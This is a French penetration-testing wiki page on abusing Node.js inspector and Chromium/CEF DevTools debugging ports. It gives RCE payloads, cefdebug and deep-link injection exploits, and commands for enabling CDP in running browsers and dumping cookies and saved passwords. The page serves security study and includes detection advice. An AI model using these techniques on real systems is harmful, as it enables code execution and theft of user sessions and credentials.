# Abus du débogueur Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

Parmi les exemples pratiques historiques figurent le walkthrough Multimaster et l’attaque du débogueur de Visual Studio Code CVE-2019-1414 ; utilisez-les comme contexte propre à certaines versions, plutôt que de supposer que toutes les cibles Electron ou Chromium actuelles exposent les mêmes primitives.<sup>[[1]](#references)[[3]](#references)</sup>

## Informations de base

[D’après la documentation](https://nodejs.org/learn/getting-started/debugging) : lorsqu’un processus Node.js est lancé avec l’option `--inspect`, il écoute les clients de débogage. Par **défaut**, il écoute sur l’hôte et le port **`127.0.0.1:9229`**. Un **UUID** **unique** est également attribué à chaque processus.<sup>[[4]](#references)</sup>

Les clients Inspector doivent connaître et spécifier l’adresse de l’hôte, le port et l’UUID pour se connecter. Une URL complète ressemble à `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Comme le **débogueur a un accès complet à l’environnement d’exécution Node.js**, un acteur malveillant capable de se connecter à ce port peut être en mesure d’exécuter du code arbitraire au nom du processus Node.js (**élévation potentielle de privilèges**).<sup>[[4]](#references)</sup>

Il existe plusieurs façons de démarrer un Inspector :<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Lorsque vous démarrez un processus inspecté, quelque chose comme ceci apparaîtra :<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Les processus basés sur **CEF** (**Chromium Embedded Framework**) peuvent exposer un débogueur avec `--remote-debugging-port=9222`. Cela expose le navigateur via le [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) plutôt que via un inspecteur Node.js ; les payloads Node.js basés sur `process` ne s'appliquent donc pas directement par défaut.<sup>[[2]](#references)[[5]](#references)</sup>

Lorsque vous démarrez un navigateur en mode débogage, quelque chose comme ceci apparaît :<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Énumérer et piloter un endpoint CDP

Les endpoints de découverte HTTP distinguent le WebSocket du **browser** de ceux des **targets** individuels (onglet, worker, extension, etc.). Interrogez `/json/version` pour obtenir l’endpoint du browser et `/json/list` pour les targets ; les valeurs `webSocketDebuggerUrl` renvoyées peuvent ensuite être pilotées directement avec les messages de type JSON-RPC de CDP.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Par exemple, connectez-vous avec `websocat "$BROWSER_WS"` et envoyez `{"id":1,"method":"Target.getTargets"}` ou `{"id":2,"method":"Storage.getCookies"}`. Sur une cible de page (`websocat "$PAGE_WS"`), `Runtime.evaluate` s’exécute dans ce renderer et `Page.captureScreenshot` renvoie une capture d’écran encodée en base64. `document.cookie` ne peut pas révéler les cookies `HttpOnly`, tandis que `Storage.getCookies` interroge le navigateur pour obtenir son magasin de cookies.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Navigateurs, WebSockets et politique de même origine <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Les sites web ouverts dans un navigateur peuvent envoyer des requêtes WebSocket et HTTP dans le cadre du modèle de sécurité du navigateur. Une **connexion HTTP initiale** est nécessaire pour **obtenir un identifiant de session de débogueur unique**. La **politique de même origine** **empêche** les sites web d’établir **cette connexion HTTP**. Pour se protéger davantage contre les [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js vérifie que les **en-têtes 'Host'** de la connexion indiquent soit une **adresse IP**, soit précisément **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> **Cette mesure de sécurité empêche d’exploiter l’inspecteur** pour exécuter du code en **envoyant simplement une requête HTTP** (ce qui pourrait se faire en exploitant une vuln SSRF).<sup>[[4]](#references)</sup>

### Démarrer l’inspecteur dans des processus en cours d’exécution

Vous pouvez envoyer le **signal SIGUSR1** à un processus nodejs en cours d’exécution pour lui faire **démarrer l’inspecteur** sur le port par défaut. Cependant, notez que vous devez disposer de privilèges suffisants ; cela peut donc vous donner un **accès privilégié aux informations contenues dans le processus**, mais ne constitue pas une élévation directe de privilèges.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> C’est utile dans les conteneurs, car **arrêter le processus et en démarrer un nouveau** avec `--inspect` **n’est pas une option**, puisque le **conteneur** sera **arrêté** avec le processus.<sup>[[6]](#references)</sup>

### Se connecter à l’inspecteur/debugger

Pour se connecter à un navigateur basé sur **Chromium**, les URL `chrome://inspect` ou `edge://inspect` peuvent être utilisées pour Chrome ou Edge, respectivement. En cliquant sur le bouton Configure, il faut s’assurer que **l’hôte cible et le port** sont correctement répertoriés. L’image montre un exemple de Remote Code Execution (RCE) :<sup>[[2]](#references)[[4]](#references)</sup>

![Une URL d’accès au debugger s’affichera. Par exemple : ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Se connecter à l’inspecteur/debugger : Pour se connecter à un navigateur basé sur Chromium,...](<../../images/image (674).png>)

En utilisant la **ligne de commande**, vous pouvez vous connecter à un debugger/inspector avec :<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

L’outil [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permet de **trouver les inspecteurs** exécutés localement et d’y **injecter du code**.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Notez que les exploits **RCE NodeJS ne fonctionneront pas** si vous êtes connecté à un navigateur via le [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (vous devez consulter l’API pour trouver des choses intéressantes à faire avec).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE dans le débogueur/inspecteur NodeJS

> [!TIP]
> Si vous êtes arrivé ici en cherchant comment obtenir une [**RCE à partir d’un XSS dans Electron, consultez cette page.**](../../desktop-application-security/electron-desktop-apps/index.html)

Voici quelques méthodes courantes pour obtenir une **RCE** lorsque vous pouvez **vous connecter** à un **inspector** Node (il semble que cela **ne fonctionnera pas avec une connexion au Chrome DevTools Protocol**) :<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Charges utiles du protocole Chrome DevTools

Vous pouvez consulter l’API ici : [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Dans cette section, je vais simplement lister des usages intéressants que j’ai vu des personnes exploiter avec ce protocole.

### Restriction du profil par défaut à partir de Chrome 136

À partir de **Chrome 136**, Chrome ignore `--remote-debugging-port` et `--remote-debugging-pipe` lorsqu’ils ciblent le **répertoire de données Chrome par défaut**. L’option doit être associée à un `--user-data-dir` non standard, dont la clé de chiffrement distincte et l’état de navigateur isolé empêchent cette simple technique basée sur un flag d’exposer le profil habituel de l’utilisateur, avec ses sessions authentifiées. Il ne faut pas supposer que cette restriction spécifique à Chrome s’applique aux anciennes versions de Chrome, à Chrome for Testing, aux applications Electron/CEF ou à d’autres dérivés de Chromium sans vérification.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Par conséquent, voir un processus Chrome actuel lancé uniquement avec `--remote-debugging-port` ne prouve **pas** que CDP est devenu actif. Vérifiez le listener et `/json/version`, et déterminez quel profil est réellement utilisé.<sup>[[14]](#references)</sup>

### Injection de paramètres via des liens profonds

Dans [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), Rhino Security a découvert qu’une application basée sur CEF avait **enregistré une URI** personnalisée dans le système (`workspaces://index.html`), qui recevait l’URI complète puis **lancé l’applicatio**n basée sur CEF avec une configuration partiellement construite à partir de cette URI.<sup>[[8]](#references)</sup>

Il a été découvert que les paramètres de l’URI étaient décodés depuis l’URL et utilisés pour lancer l’application de base CEF, ce qui permettait à un utilisateur **d’injecter** le flag **`--gpu-launcher`** dans la **ligne de commande** et d’exécuter n’importe quoi.<sup>[[8]](#references)</sup>

Ainsi, un payload comme :

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Exécutera calc.exe.<sup>[[8]](#references)</sup>

### Écraser des fichiers

Modifiez le dossier dans lequel les **fichiers téléchargés seront enregistrés** et téléchargez un fichier pour **remplacer** le **code source** fréquemment utilisé par l’application par votre **code malveillant**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### RCE et exfiltration via WebDriver

STAR Labs a montré que des services WebDriver/CDP exposés peuvent permettre la lecture arbitraire de fichiers et l'exécution de code à distance (RCE) ; le DNS rebinding peut compléter la chaîne d'exploitation dans certaines configurations.<sup>[[9]](#references)</sup>

Le service WebDriver de ChromeDriver est distinct de Chrome DevTools/CDP. Sa capacité [`goog:chromeOptions.binary`](https://developer.chrome.com/docs/chromedriver/capabilities) sélectionne l'exécutable du navigateur lancé pour une nouvelle session. Si un utilisateur non privilégié peut accéder à un service ChromeDriver exécuté en tant que root et créer une session en fournissant le chemin d'un exécutable qu'il contrôle, ce lancement peut franchir la limite de privilèges du service. Une réponse vide à `/sessions` ne permet pas de déterminer si de nouvelles sessions peuvent être créées. Avant de conclure que cette voie est exploitable, vérifiez le propriétaire du processus, l'accessibilité réelle du port d'écoute, l'autorisation des sessions, l'accès à l'exécutable et les mécanismes de confinement ; le nom du processus ou son port habituel ne suffisent pas. Les [recommandations de sécurité de Google](https://developer.chrome.com/docs/chromedriver/security-considerations) préconisent d'exécuter ChromeDriver sous un compte non privilégié. L'énumération passive ne doit pas créer de session WebDriver.

Pour d'autres exemples historiques liés à l'automatisation de navigateur et à la sécurité de Chromium, consultez l'analyse de Counter WebDriver et les rapports Project Zero 773, 1742 et 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Activation de CDP dans un processus Chromium en cours d'exécution

La restriction de Chrome sur le profil par défaut bloque uniquement l'activation par ligne de commande. Avec un accès suffisant pour manipuler le processus du navigateur sous le même compte utilisateur, le [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) original et le [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF) de Cobalt Strike appellent la fonction non exportée de Chromium `content::DevToolsAgentHost::StartRemoteDebuggingServer` dans le processus `chrome.exe` ou `msedge.exe` déjà en cours d'exécution. Le point de terminaison est ainsi associé au véritable profil et conserve ses onglets, extensions, cookies et état d'authentification.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

Pour les processus Chrome/Edge x64 classiques, le BOF trouve la fenêtre du navigateur et la bibliothèque `chrome.dll`/`msedge.dll` chargée, parcourt le PE distant à la recherche de signatures masquées, alloue des stubs et un bloc de contexte, remplace temporairement la procédure de fenêtre, puis exécute l'appel final sur le **thread d'interface utilisateur (UI)** du navigateur. Les entrées d'exécution concernées sont `StartRemoteDebuggingServer`, l'`operator new` de Chromium, `TCPServerSocketFactory::CreateForHttpServer` et la vtable de la factory. L'exécution s'arrête si l'une des signatures obligatoires ne correspond pas de manière unique.<sup>[[15]](#references)[[16]](#references)</sup>

Le BOF accepte un mode de navigateur et un port facultatif. Son script auxiliaire peut ensuite vérifier le point de terminaison et récupérer les cookies ; `chrome-iso` est une voie distincte qui cible la limite Windows Process Isolation de Chrome.<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

Le chemin `chrome-iso` utilise uniquement des handles limités aux droits de requête vers le processus isolé. Il identifie le `chrome.dll` installé dont la taille de l’image PE correspond à celle du processus en cours, résout les symboles à partir de cette image locale et utilise le dispatch `WindowImpl` de Chromium, ainsi que `WM_COPYDATA` synchrone et un hook User32 déjà présent dans une image, pour atteindre le thread UI.<sup>[[16]](#references)</sup>

> [!WARNING]
> Il s’agit d’une technique de **manipulation du processus du navigateur après compromission**, et non d’un contournement réseau sans authentification. Elle dépend de la build, car les symboles C++ concernés ne sont pas exportés et peuvent changer après les mises à jour du navigateur.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### Actualiser les signatures après les mises à jour du navigateur

Utilisez la version exacte de `chrome.dll` ou `msedge.dll` installée sur la cible et le PDB correspondant. `symchk.exe`, fourni avec le Windows SDK, télécharge les symboles ; les scripts du dépôt localisent ensuite `StartRemoteDebuggingServer`, déterminent les paramètres de l’allocateur et de la fabrique de sockets, ou valident chaque signature intégrée au BOF.<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

Un résultat sans correspondance ou avec plusieurs correspondances ne doit pas être remplacé par une adresse arbitraire. Si un motif connu de `operator new` ou `CreateForHttpServer` a trop changé pour servir à créer un nouveau masque, utilisez `pe_signature_finder.py` avec le PDB pour examiner ce symbole et dériver une séquence d’octets unique dans le module cible.<sup>[[16]](#references)[[18]](#references)</sup>

#### Extraction via navigateur authentifié avec CDP Toolkit

Cette technique ne déchiffre pas hors ligne l’App-Bound Encryption (ABE) et ne supprime pas la liaison à l’appareil. Elle traite plutôt le navigateur légitime comme un **oracle de déchiffrement et un proxy d’interaction authentifié** : `Storage.getCookies` demande au navigateur actif son magasin de cookies, tandis que les workflows de navigation et de screencast maintiennent les requêtes, le stockage, l’authentification d’entreprise et le comportement lié à l’appareil dans le navigateur existant de la victime.<sup>[[17]](#references)[[18]](#references)</sup>

Après avoir redirigé le listener CDP loopback via le pivot de l’opérateur, [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) peut énumérer et collecter les artefacts courants.<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump` et `tabs screenshot` sont principalement des wrappers autour de `/json/version`, de la liste des targets, de `Storage.getCookies` et de `Page.captureScreenshot`. L’historique, les favoris, les extensions et les métadonnées des mots de passe nécessitent plutôt une target WebUI temporaire `chrome://`/`edge://` : le toolkit attend que l’interface soit rendue, inspecte son modèle ou son DOM, récupère le résultat et ferme la target.<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump` va plus loin : il ouvre l’origine des identifiants enregistrés, place le focus dans un champ d’identifiant, sélectionne la suggestion native de remplissage automatique à l’aide d’événements d’entrée CDP, puis lit les valeurs renseignées. L’origine, le port et le chemin doivent correspondre de près au realm du mot de passe enregistré ; le mode visible est le choix par défaut le plus fiable, car la fenêtre contextuelle de suggestion fait partie de l’interface native du navigateur.<sup>[[17]](#references)[[18]](#references)</sup>

Pour une interaction en direct, `browser-takeover screencast` diffuse des images et envoie des entrées à une target réelle, y compris en mode arrière-plan ou hors écran. `browser-takeover proxy` accepte plutôt localement les requêtes HTTP et HTTPS `CONNECT` et effectue les requêtes vers les serveurs en amont via des targets Chrome masquées, avec recours aux onglets en arrière-plan lorsque les targets masquées ne sont pas disponibles. Cette méthode préserve le contexte réseau et d’authentification de la victime, mais est moins fidèle pour les applications côté client complexes, car le navigateur de l’opérateur effectue le rendu du contenu renvoyé.<sup>[[17]](#references)[[18]](#references)</sup>

Pour la détection, ne vous fiez pas uniquement à la télémétrie des arguments de ligne de commande `--remote-debugging-*` : corrélez également les handles inhabituels et les opérations mémoire visant les processus du navigateur (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, création de threads), l’injection de DLL et les sockets d’écoute loopback inattendues appartenant à Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

Dans un environnement réel, **après avoir compromis** un PC utilisateur équipé d’un navigateur basé sur Chromium, une technique historique consistait à relancer le navigateur avec le débogage activé et à transférer le port loopback. Cela peut exposer l’état de navigation de la victime sur les produits et versions qui acceptent encore le profil sélectionné, mais Chrome 136+ ne l’appliquera pas à son répertoire de données par défaut.<sup>[[7]](#references)[[14]](#references)</sup>

La commande de relance d’origine est conservée ci-dessous pour les anciennes versions et les cibles propres à certaines versions. La deuxième commande est la méthode prise en charge par les versions actuelles de Chrome, mais elle crée un profil isolé au lieu de rouvrir l’état normal authentifié de la victime.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Pour le tradecraft spécifique à macOS concernant le relancement de Chromium, les extensions et CDP, consultez [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Outil d’inspection et d’exploitation du débogueur CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414 : exécution de code à distance via le débogueur Chrome DevTools de Visual Studio Code](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Guide de débogage Node.js - Premiers pas](https://nodejs.org/learn/getting-started/debugging)
- [5] [Protocole Chrome DevTools](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Compte rendu corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-exploitation : abuser de la fonctionnalité de débogage de Chrome pour observer et contrôler des sessions de navigation à distance](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112 : exécution de code à distance dans AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Tu me parles ? - RCE via WebDriver, DNS rebinding et CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Contre WebDriver - Du bot à la RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero, problème 773 (suivi des bugs Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero, problème 1742 (suivi des bugs Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero, problème 1944 (suivi des bugs Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Modifications des options de débogage à distance pour améliorer la sécurité - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Injection de CDP dans un navigateur Edge en cours d’exécution : analyse approfondie de l’instrumentation du navigateur à l’exécution](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - Le retour du Cookie Monster](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
